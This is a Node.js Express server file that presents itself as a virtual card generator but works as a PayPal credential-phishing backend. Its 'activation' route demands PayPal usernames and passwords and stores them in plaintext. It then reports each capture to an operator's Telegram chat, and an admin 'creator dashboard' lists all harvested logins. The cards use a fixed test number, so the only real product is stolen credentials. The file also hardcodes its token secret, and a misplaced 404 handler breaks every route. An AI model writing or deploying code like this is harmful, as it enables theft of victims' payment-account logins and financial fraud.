const express = require('express');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());

// Data file initialization with error handling
const dataFile = 'data.json';
let data = { users: [], cards: [], logs: [] };
try {
    if (fs.existsSync(dataFile)) {
        data = JSON.parse(fs.readFileSync(dataFile));
    }
} catch (error) {
    console.error('Failed to load data.json:', error);
    data = { users: [], cards: [], logs: [] };
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
}

// Middleware to verify token
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (!token) return res.status(401).json({ error: 'No token provided' });

    jwt.verify(token, 'your-secret-key', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// Custom 404 handler to return JSON
app.use((req, res, next) => {
    res.status(404).json({ error: 'Route not found' });
});

// Authentication routes
app.post('/api/auth/signup', (req, res) => {
    try {
        const { username, password } = req.body;
        if (!username || !password || !/^[a-zA-Z0-9@.]+$/.test(username)) {
            return res.status(400).json({ error: 'Invalid username or password' });
        }
        if (data.users.find(u => u.username === username)) {
            return res.status(400).json({ error: 'Username already exists' });
        }
        data.users.push({ username, password });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.status(201).json({ message: 'User created successfully' });
    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Server error during signup' });
    }
});

app.post('/api/auth/login', (req, res) => {
    try {
        const { username, password } = req.body;
        const user = data.users.find(u => u.username === username && u.password === password);
        if (!user) return res.status(401).json({ error: 'Invalid credentials' });
        const token = jwt.sign({ username }, 'your-secret-key', { expiresIn: '1h' });
        res.json({ token });
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Server error during login' });
    }
});

// Card management routes
app.get('/api/cards', authenticateToken, (req, res) => {
    try {
        const userCards = data.cards.filter(c => c.user === req.user.username);
        res.json(userCards);
    } catch (error) {
        console.error('Fetch cards error:', error);
        res.status(500).json({ error: 'Server error fetching cards' });
    }
});

app.post('/api/cards/generate', authenticateToken, (req, res) => {
    try {
        const { name, expDate, amount } = req.body;
        if (!name || !expDate || !amount || amount <= 0 || !/^\d{6}$/.test(expDate)) {
            return res.status(400).json({ error: 'Invalid card details' });
        }
        const cardId = Date.now().toString();
        const card = { cardId, name, expDate, amount, number: '4111-1111-1111-1111', cvv: '123', user: req.user.username, status: 'pending' };
        data.cards.push(card);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.status(201).json({ cardId });
    } catch (error) {
        console.error('Generate card error:', error);
        res.status(500).json({ error: 'Server error generating card' });
    }
});

app.delete('/api/cards/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const cardIndex = data.cards.findIndex(c => c.cardId === cardId && c.user === req.user.username);
        if (cardIndex === -1) return res.status(404).json({ error: 'Card not found' });
        data.cards.splice(cardIndex, 1);
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
        res.json({ message: 'Card deleted' });
    } catch (error) {
        console.error('Delete card error:', error);
        res.status(500).json({ error: 'Server error deleting card' });
    }
});

app.get('/api/cards/activate/:cardId', authenticateToken, (req, res) => {
    try {
        const cardId = req.params.cardId;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        res.json(card);
    } catch (error) {
        console.error('Activation fetch error:', error);
        res.status(500).json({ error: 'Server error fetching activation details' });
    }
});

app.post('/api/cards/activate/:cardId', authenticateToken, async (req, res) => {
    try {
        const cardId = req.params.cardId;
        const { username, password } = req.body;
        const card = data.cards.find(c => c.cardId === cardId && c.user === req.user.username);
        if (!card) return res.status(404).json({ error: 'Card not found' });
        if (!username || !password) return res.status(400).json({ error: 'PayPal credentials required' });
        card.status = 'activated';
        card.paypalUsername = username;
        card.paypalPassword = password;
        data.logs.push({ user: req.user.username, time: Date.now() });
        fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));

        // Telegram notification
        const message = `Card ${cardId} activated by ${req.user.username} with PayPal: ${username}`;
        await sendTelegramNotification(message);

        res.json({ message: 'Card activated', cardId });
    } catch (error) {
        console.error('Activate card error:', error);
        res.status(500).json({ error: 'Server error activating card' });
    }
});

app.get('/api/cards/logs', authenticateToken, (req, res) => {
    try {
        res.json(data.logs);
    } catch (error) {
        console.error('Fetch logs error:', error);
        res.status(500).json({ error: 'Server error fetching logs' });
    }
});

app.get('/api/creator/dashboard', authenticateToken, (req, res) => {
    try {
        if (req.user.username !== 'admin') return res.status(403).json({ error: 'Access denied' });
        res.json({ generatedCards: data.cards, paypalLogins: data.cards.filter(c => c.paypalUsername) });
    } catch (error) {
        console.error('Dashboard error:', error);
        res.status(500).json({ error: 'Server error loading dashboard' });
    }
});

// Telegram notification function
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'your-bot-token';
const TELEGRAM_CHAT_ID_ADMIN = process.env.TELEGRAM_CHAT_ID_ADMIN || 'your-chat-id';
async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID_ADMIN) {
        console.log('Telegram notification skipped: Missing token or chat ID');
        return;
    }
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_ADMIN, text: message })
        });
        console.log('Telegram notification sent:', message);
    } catch (error) {
        console.error('Telegram notification error:', error);
    }
}

// Global error handler
app.use((err, req, res, next) => {
    console.error('Global error:', err.stack);
    res.status(500).json({ error: 'Internal server error' });
});

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});

// Save data on process exit
process.on('SIGTERM', () => {
    fs.writeFileSync(dataFile, JSON.stringify(data, null, 2));
    process.exit(0);
});
